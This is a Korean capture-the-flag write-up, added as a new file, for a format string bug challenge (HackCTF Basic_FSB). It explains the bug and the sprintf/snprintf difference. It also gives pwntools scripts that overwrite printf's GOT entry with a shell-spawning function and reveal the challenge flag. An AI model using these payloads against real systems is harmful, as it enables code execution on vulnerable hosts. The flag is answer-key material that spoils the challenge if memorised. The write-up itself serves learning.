@@ -1,0 +1,221 @@
+풀이
+
+포맷 스트링 버그(Format String bug,이하 FSB)란 버퍼 오버플로우 해킹 기법의 한종류로써, 
+사용자의 입력에 의해서 프로그램의 흐름을 변경시킬수있는 취약점이다.
+
+
+설명 : https://kaspyx.tistory.com/74
+
+
+페이로드 방식
+
+>>평범한 BOF 방식
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz',3001)	# 접속할 사이트 랑 포트
+payload =  "A"*128		# 버퍼 입력
+payload += p32(0x804849b)	# 위치 즉 ret값
+
+p.sendline(payload)
+p.lnteractive()
+
+>> fsb 방식
+
+from pwn import *
+ 
+p = remote('ctf.j0n9hyun.xyz', 3002)
+e = ELF('./basic_fsb')
+ 
+flag = 0x80485B4		# 주소
+printf_got = 0x0804A00C	# 주소	> 알아보기
+ 
+pay = p32(printf_got) 
+pay += '%134514096x' 
+pay += '%n' 
+ 
+p.recv()
+p.sendline(pay)
+ 
+p.interactive()
+
+
+
+풀이
+
+
+file을 gdb -q basic_fbs 를 해주고 checksec 를 해주면
+
+
+CANARY : disabled
+FORTIFY : disabled
+NX : disabled
+PIE : disabled
+RELRO : Partial
+
+이다. RELRO 에 걸려있는것이 Partial 이므로 GOT overwrite 가 가능하다.
+
+즉 깔끔하게 아무것도 걸려있지 않은 파일이다.
+
+이제 ida 를 이용해서 해당 어셈블리언어를 C언어로 번역하게되면
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+	setvbuf(stdout, 0, 2, 0);
+	vuln();
+	return 0;
+}
+
+이다.
+
+이프로그램을 실행시키면 먼저 stdout를 세팅해주고 vuln이라는 함수를 실행
+시켜준다.
+
+vuln() 함수는
+
+int vuln()
+{
+	char s;
+	char format;
+
+	printf("input : ");
+	fgets(&s, 1024,stdin);
+	snprintf(&format, 0x400u, &s);
+	return printf(&format);
+}
+
+일단 모자면 변수 2개 s와 format을 선언후 s변수에 1024만큼 입력을 받는다.
+
+그리고 snprintf를 출력하고 printf로 출력해준다.
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+snprintf란??
+
+변수에 문자열을 넣어줌으로서 정해진 바이트수를 변수로 출력해주는 역할
+
+
+sprintf와 snprintf 의 차이
+
+sprintf(abc, "%-*s", 3, buf);
+
+snrpintf(abc, 4, "%-*s", 3, buf);
+
+라는 코드를 적게되면 위에 소스코드로 a b c d e f g h i null 중에 코드를 통해 출력해보자
+
+sprintf로 복사해온 abc를 출력해보면
+
+abc안의 값이 buf 의 값과 동일하게 나오게된다.
+즉 a b c d e f g h i 까지 모두 나오게된다.
+
+사이즈는 겨우4칸 뿐인데도 10자리를 가진 buf 값 모두를 가지고 오게된다.
+
+다른변수의 메모리 영역까지 침범할수있는 무서운 부분이다.
+
+반면 snprintf 는 정상적으로 "abc" 의 값만이 채워져 있다.
+즉 sprintf처럼 다른변수의 메모리영역 까지 침범하지 않는다.
+
+이러한 차이는
+
+snprintf 는 사용자가 두번쨰 인자값으로 넘긴 만큼만 갖고오면서, 마지막 주소지엔 알아서
+널값을 채워주기 떄문에 내가원하는 3개의 값이 출력 된다.
+
+sprintf 는 그런 인자 값이 없기떄문에 null 값이 있는 부분까지 전부 긁는다.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+따라서 이제 포맷스트링 버그를 이용해서 뚫어야한다.
+
+그리고 이 바이너리 파일 안에 /bin/sh 를 실행시켜주는 함수가 있다.
+
+(flag 함수)
+
+즉 snprintf 부분에서 printf 의 GOT를 flag 주소로 바꿔버리면 printf 주소인줄알고
+flag 함수를 실행시킨다.
+
+즉 이제 푸는 방법을 생각해보면
+
+1. %p를 이용해 각 포맷스트링이 가르키는 위치를 파악한다.
+
+2. printf got 을 입력하고 flag 주소값 크기만큼 출력해준다.
+
+3. printf got 을 입력한 부분을 가리키는 부분에  %n을 넣어서 지금까지 출력한
+바이트 수를 넣어준다.
+
+4.  다음 printf가 실행되면 printf대신에 flag함수가 실행되게 한다.
+
+이렇게하면 답을 구할수있다.
+
+이제 1번을 구해보자.
+
+(1)
+
+
+해당 바이너리 파일에 aaaa를 넣고 %p를 한다.
+
+그렇게되면 2번쨰 부분에 aaaa가 들어간것을 알수있다. 이부분에 %n을 이용하면 된다.
+
+이제 우리가 printf got 부분에 flag 주소를 넣어야하기에
+flag 주소를 구한다
+
+disas flag 를 입력하면
+
+0x080485b4 falg 주소
+
+
+0x080485b4 이것을 10진수로 바꾸면 134514100 이다.
+
+이제 printf got 를 덮을 위치 + %(134514100에서 -4바이트를 뺸 134514096)%n 이다
+
+즉 %n을 이용하여 flag를 주소값을 맞춰야하는데 아까 aaaa %p %p %p %p 를 구할떄 두번쨰
+자리에 들어간것을보고 앞의 자리 printf@got가 입력되었으므로 4바이트를 빼주어야함 
+그래서 %134514096%n 이다.
+
+이제 페이로드를 작성해보면
+
+
+from pwn import *
+
+p = remote("ctf.j0n9hyun.xyz",3002)	# 호스트
+e = ELF("./basic_fsb")		# 파일 이름 (fsb)
+
+pay = p32(e.got['printf'])		# 32비트화 e.got('printf') printf 부분에
+pay += "%134514096x%n"		# flag 주소값을 넣어준다 ( 플래그를 10진수화 시켰음)
+
+p.sendline(pay)
+p.interactive()
+
+
+
+이는 p로 호스트를 설정하고
+e 로 내가 fsb를 할 파일이름을 넣는다. ELF("./파일이름")
+
+p32 > 32비트화시켜줌
+
+그리고 pay = p32(e.got['printf'])	우리가 넣어야할 주소를 설정하고
+
+뒤에 pay += "%134514096x%n" 을 넣어준다. 즉 플래그 주소를 넣어준다.
+
+플래그 주소는 (플래그 주소 - 4바이트)   
+
+## 4바이트를 빼는 이유는 포멧스트링을하면서
+더미를 찾았을떄 aaaa %p %p %p %p %p 를 하였을때
+
+aaaa 가 2번쨰 위치에 들어가는것을 보고 앞선 첫번쨰 자리 4바이트를 빼준것이다.
+
+즉 printf@got + %(flag주소-4바이트)x%n 인것이다.
+
+그리고 python 파일이름.py 를 실행하게되면
+
+쉘에 접속할수있어 cat flag를 통해 플래그를 얻을수 있다.
+
+플래그는
+
+HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?} 
+
+이다.
+
+
